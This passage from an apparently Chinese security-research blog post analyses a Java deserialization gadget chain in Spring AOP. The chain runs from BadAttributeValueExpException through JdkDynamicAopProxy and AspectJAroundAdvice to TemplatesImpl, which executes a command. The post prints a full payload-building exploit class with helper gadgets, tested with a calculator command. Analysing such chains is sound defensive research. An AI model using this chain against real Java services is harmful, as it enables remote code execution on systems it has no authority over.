<code>getInterceptorsAndDynamicInterceptionAdvice</code> 方法。其主要作用是根据当前方法（<code>method</code>）和目标类（<code>targetClass</code>），从配置的 Advisor 列表中筛选出匹配的拦截器（<code>MethodInterceptor</code>），并生成最终的拦截器链。</p><p>我们需要重点关注的是这个函数的返回值。因为他会被赋值给cached。</p><p>这个方法最终返回的就是<code>interceptorList</code>对象，我们需要再分析这个对象如何添加元素，然后往上找这个元素是怎么生成的。</p><p><code>interceptorList</code>被创建之后存在两种可以运行的函数一种是interceptorList.add()一种是interceptorList.addAll()</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>我们可以发现无论是addAll函数还是add函数的调用前面都有</p><p>registry.getInterceptors(advisor);</p><p>getInterceptors是一个获得拦截器的函数</p><p>而<code>registry</code>则是直接通过静态<code>GlobalAdvisorAdapterRegistry.getInstance()</code>方法获取的静态单例类</p><p>这里下面一小部分粘贴笔者原话偷个懒(因为写到这的时候有事情忙去了。过段时间回来看已经大脑空白了。)</p><p>但是下面的项目源代码是我自己写的分析(先写的项目源代码分析然后再写污染链分析)</p><p>静态单例类一般无法通过反序列化过程控制的，要想修改这种实例的元素或属性，还需要其他执行分支甚至其他反序列化gadget chain来调用实例的方法。</p><p>认真审了一下<code>org.springframework.aop.framework.adapter.DefaultAdvisorAdapterRegistry#getInterceptors</code>方法。</p><p>一下子就看到了希望，核心逻辑：advice变量是可控的，如果这个变量同时实现<code>Advice</code>和<code>MethodInterceptor</code>接口，则可以将其添加到interceptors，这个interceptors就是我们最终返回的目标chain。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> MethodInterceptor[] getInterceptors(Advisor advisor) <span class="keyword">throws</span> UnknownAdviceTypeException &#123;</span><br><span class="line">    List&lt;MethodInterceptor&gt; interceptors = newArrayList&lt;&gt;(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// 可控，只要可序列化即可</span></span><br><span class="line">    Adviceadvice= advisor.getAdvice();</span><br><span class="line">    <span class="keyword">if</span> (advice <span class="keyword">instanceof</span> MethodInterceptor) &#123;</span><br><span class="line">        <span class="comment">// 如果advice本身实现了MethodInterceptor接口，将advice直接添加到interceptors！！！</span></span><br><span class="line">        interceptors.add((MethodInterceptor) advice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (AdvisorAdapter adapter : <span class="built_in">this</span>.adapters) &#123;</span><br><span class="line">        <span class="keyword">if</span> (adapter.supportsAdvice(advice)) &#123;</span><br><span class="line">            interceptors.add(adapter.getInterceptor(advisor));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (interceptors.isEmpty()) &#123;</span><br><span class="line">        thrownewUnknownAdviceTypeException(advisor.getAdvice());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> interceptors.toArray(newMethodInterceptor[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>笔者的需求是interceptors中元素是一个<code>AspectJAroundAdvice</code>实例，很显然，这个类满足了实现<code>MethodInterceptor</code>接口的需求，但并没有实现<code>Advice</code>….</p><p>看到这里，熟悉反序列化或者是看过笔者上一篇文章文章的小伙伴，应该会一下子就想到动态代理，而我们恰好又有spring-aop依赖，<code>JdkDynamicAopProxy</code>本来不就是用来做这个东西的吗？</p><p>通过<code>JdkDynamicAopProxy</code>来同时代理<code>Advice</code>和<code>MethodInterceptor</code>接口，并设置反射调用对象是<code>AspectJAroundAdvice</code>，如果后续仅被调用<code>MethodInterceptor</code>接口的方法，就可以直接混水摸鱼，如果还会调用<code>Advice</code>接口的方法，则可以再尝试使用<code>CompositeInvocationHandlerImpl</code>，详情可以参考上一篇文章《高版本Fastjson在Java原生反序列化中的利用》。</p><p>经过测试，这里只需要<code>JdkDynamicAopProxy</code>就可以了。到这里，整条gadget chain的主要障碍都基本被扫清了，剩下的就是一些边边角角的修改。</p><h2 id="项目源代码分析："><a href="#项目源代码分析：" class="headerlink" title="项目源代码分析："></a>项目源代码分析：</h2><p>这里粘贴主要文件的源码。会在后续内容粘贴其他文件的部分源码。想看完整版的可以去看项目</p><p>有些代码块太长复杂的话我一般都在代码块后面直接讲这段实现了什么或者重点是什么。可以先看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.aopalliance.aop.Advice;</span><br><span class="line"><span class="keyword">import</span> org.aopalliance.intercept.MethodInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.Advisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJExpressionPointcut;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.SingletonAspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.DefaultAdvisorChainFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.support.DefaultIntroductionAdvisor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringAOP1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">SpringAOP1</span> <span class="variable">aop1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpringAOP1</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> aop1.getObject(Util.getDefaultTestCmd());</span><br><span class="line">        Util.runGadgets(object);</span><br><span class="line"><span class="comment">//        String path = &quot;/tmp/Deserialization/AOP1/aop1.ser&quot;;</span></span><br><span class="line"><span class="comment">//        Util.writeObj2File(object,path);</span></span><br><span class="line"><span class="comment">//        Util.readObj4File(path);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(String cmd)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">AspectJAroundAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> getAspectJAroundAdvice(cmd);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy1</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(aspectJAroundAdvice);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy1</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy1, Advisor.class, MethodInterceptor.class);</span><br><span class="line">        <span class="type">Advisor</span> <span class="variable">advisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultIntroductionAdvisor</span>((Advice) proxy1);</span><br><span class="line">        List&lt;Advisor&gt; advisors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        advisors.add(advisor);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisors&quot;</span>,advisors);</span><br><span class="line">        <span class="type">DefaultAdvisorChainFactory</span> <span class="variable">advisorChainFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultAdvisorChainFactory</span>();</span><br><span class="line">        Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisorChainFactory&quot;</span>,advisorChainFactory);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy2</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(<span class="string">&quot;ape1ron&quot;</span>,advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy2</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy2, Map.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">badAttrValExe</span> <span class="operator">=</span> BadAttrValExeNode.makeGadget(proxy2);</span><br><span class="line">        <span class="keyword">return</span> badAttrValExe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> AspectJAroundAdvice <span class="title function_">getAspectJAroundAdvice</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> TemplatesImplNode.makeGadget(cmd);</span><br><span class="line">        <span class="type">SingletonAspectInstanceFactory</span> <span class="variable">singletonAspectInstanceFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingletonAspectInstanceFactory</span>(templatesImpl);</span><br><span class="line">        <span class="type">AspectJAroundAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> Reflections.newInstanceWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;aspectInstanceFactory&quot;</span>,singletonAspectInstanceFactory);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;declaringClass&quot;</span>, TemplatesImpl.class);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;parameterTypes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//        Method targetMethod = Reflections.getMethod(TemplatesImpl.class,&quot;newTransformer&quot;,new Class[0]);</span></span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(aspectJAroundAdvice,&quot;aspectJAdviceMethod&quot;,targetMethod);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AspectJExpressionPointcut</span> <span class="variable">aspectJExpressionPointcut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectJExpressionPointcut</span>();</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;pointcut&quot;</span>,aspectJExpressionPointcut);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;joinPointArgumentIndex&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(aspectJAroundAdvice,<span class="string">&quot;joinPointStaticPartArgumentIndex&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> aspectJAroundAdvice;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概过一下顺序</p><p>开始分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">SpringAOP1</span> <span class="variable">aop1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpringAOP1</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> aop1.getObject(Util.getDefaultTestCmd());</span><br><span class="line">        Util.runGadgets(object);</span><br><span class="line"><span class="comment">//        String path = &quot;/tmp/Deserialization/AOP1/aop1.ser&quot;;</span></span><br><span class="line"><span class="comment">//        Util.writeObj2File(object,path);</span></span><br><span class="line"><span class="comment">//        Util.readObj4File(path);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先遇到的是getDefaultTestCmd()函数</p><p>会返回一个calc的string用于弹计算器用的</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">getDefaultTestCmd</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">String</span> osName = <span class="title class_">System</span>.<span class="title function_">getProperty</span>(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (osName.<span class="title function_">startsWith</span>(<span class="string">&quot;Mac&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着是getObject()函数。是主要逻辑</p><p>这段逻辑从末尾开始往前讲笔者感觉会更好理解。所以笔者这里从后往前分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(String cmd)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="type">AspectJAroundAdvice</span> <span class="variable">aspectJAroundAdvice</span> <span class="operator">=</span> getAspectJAroundAdvice(cmd);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy1</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(aspectJAroundAdvice);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">proxy1</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy1, Advisor.class, MethodInterceptor.class);</span><br><span class="line">    <span class="type">Advisor</span> <span class="variable">advisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultIntroductionAdvisor</span>((Advice) proxy1);</span><br><span class="line">    List&lt;Advisor&gt; advisors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    advisors.add(advisor);</span><br><span class="line">    <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">    Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisors&quot;</span>,advisors);</span><br><span class="line">    <span class="type">DefaultAdvisorChainFactory</span> <span class="variable">advisorChainFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultAdvisorChainFactory</span>();</span><br><span class="line">    Reflections.setFieldValue(advisedSupport,<span class="string">&quot;advisorChainFactory&quot;</span>,advisorChainFactory);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy2</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(<span class="string">&quot;ape1ron&quot;</span>,advisedSupport);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">proxy2</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy2, Map.class);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">badAttrValExe</span> <span class="operator">=</span> BadAttrValExeNode.makeGadget(proxy2);</span><br><span class="line">    <span class="keyword">return</span> badAttrValExe;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的BadAttrValExeNode.<em>makeGadget</em>(proxy2);是整个反序列化链的入口</p><p>先看一眼代码吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttrValExeNode</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGadget</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span> (<span class="literal">null</span>);</span><br><span class="line">        Reflections.setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, obj);</span><br><span class="line">        Reflections.setFieldValue(badAttributeValueExpException, <span class="string">&quot;stackTrace&quot;</span>, <span class="keyword">new</span> <span class="title class_">StackTraceElement</span>[<span class="number">0</span>]);</span><br><span class="line">        Reflections.setFieldValue(badAttributeValueExpException, <span class="string">&quot;cause&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里利用到了BadAttributeValueExpException这个类</p><p>构造函数和readObject函数如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们发现该构造函数的作用是将传入的 <code>val</code> 参数转换为<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>，并将结果赋值给 <code>this.val</code> 成员变量。这样做是为了在创建 <code>BadAttributeValueExpException</code> 对象时，确保 <code>this.val</code> 始终是一个字符串值</p><p>而readObject这个函数的作用是通过 <code>gf.get(&quot;val&quot;, null)</code> 方法获取名为 “val” 的字段对应的值，赋给 valObj，如果其不为String，则强行调用toString。而在上面代码我们是赋值了一个proxy2。他是一个对象。所以这里会触发tostring。也就是proxy2.tosring()</p><p>这个tostring函数触发了有什么用呢。这个函数肯定没什么用(。重点在proxy2。</p><p>想理解proxy2我们来看这两段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">jdkDynamicAopProxy2</span> <span class="operator">=</span> (InvocationHandler) JdkDynamicAopProxyNode.makeGadget(<span class="string">&quot;ape1ron&quot;</span>,advisedSupport);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxy2</span> <span class="operator">=</span> Proxy.makeGadget(jdkDynamicAopProxy2, Map.class);</span><br></pre></td></tr></table></figure><p>接下来看一下他们的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGadget</span><span class="params">(InvocationHandler handler, Class... classes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> java.lang.reflect.Proxy.newProxyInstance(Proxy.class.getClassLoader(), classes, handler);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//JdkDynamicAopProxyNode.makeGadget(&quot;ape1ron&quot;,advisedSupport);对应的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGadget</span><span class="params">(Object object,AdvisedSupport as)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    as.setTargetSource(<span class="keyword">new</span> <span class="title class_">SingletonTargetSource</span>(object));</span><br><span class="line">    <span class="keyword">return</span> Reflections.newInstance(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>,AdvisedSupport.class,as);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Object proxy2 &#x3D; Proxy.<em>makeGadget</em>(jdkDynamicAopProxy2, Map.class);这段代码的作用是给jdkDynamicAopProxy2对象添加一个额外的接口。这个接口是Map。(实现这个接口的作用是为了绕过BadAttributeValueExpException的readobject里的if检查。这样的方法在cc5链里也有。感兴趣的可以去搜搜看(笔者也只是猜测。没深入追代码。因为这个点不是本文的核心重点))</p><p>InvocationHandler jdkDynamicAopProxy2 &#x3D; (InvocationHandler) JdkDynamicAopProxyNode.<em>makeGadget</em>(“ape1ron”,advisedSupport);这段代码的意思是</p><p>通过 <code>JdkDynamicAopProxy</code> 创建了一个<strong>JDK 动态代理对象</strong>。</p><p>这个代理对象会拦截所有对 apr1ron 的方法调用，并通过 <code>AdvisedSupport</code> 里的拦截器链处理。</p><p>关于拦截方法和自定义的逻辑这方面下面有个简单案例1可以参考</p><p>关于上面这段逻辑是由org.springframework.aop.framework.JdkDynamicAopProxy下的invoke函数里的逻辑就是这个</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">equalsDefined</span> || !<span class="title class_">AopUtils</span>.<span class="title function_">isEqualsMethod</span>(method)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">hashCodeDefined</span> &amp;&amp; <span class="title class_">AopUtils</span>.<span class="title function_">isHashCodeMethod</span>(method)) &#123;</span><br><span class="line">            <span class="title class_">Integer</span> var19 = <span class="variable language_">this</span>.<span class="title function_">hashCode</span>();</span><br><span class="line">            <span class="keyword">return</span> var19;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method.<span class="title function_">getDeclaringClass</span>() == <span class="title class_">DecoratingProxy</span>.<span class="property">class</span>) &#123;</span><br><span class="line">            <span class="title class_">Class</span> var18 = <span class="title class_">AopProxyUtils</span>.<span class="title function_">ultimateTargetClass</span>(<span class="variable language_">this</span>.<span class="property">advised</span>);</span><br><span class="line">            <span class="keyword">return</span> var18;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">advised</span>.<span class="property">opaque</span> &amp;&amp; method.<span class="title function_">getDeclaringClass</span>().<span class="title function_">isInterface</span>() &amp;&amp; method.<span class="title function_">getDeclaringClass</span>().<span class="title function_">isAssignableFrom</span>(<span class="title class_">Advised</span>.<span class="property">class</span>)) &#123;</span><br><span class="line">            <span class="title class_">Object</span> var17 = <span class="title class_">AopUtils</span>.<span class="title function_">invokeJoinpointUsingReflection</span>(<span class="variable language_">this</span>.<span class="property">advised</span>, method, args);</span><br><span class="line">            <span class="keyword">return</span> var17;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">advised</span>.<span class="property">exposeProxy</span>) &#123;</span><br><span class="line">            oldProxy = <span 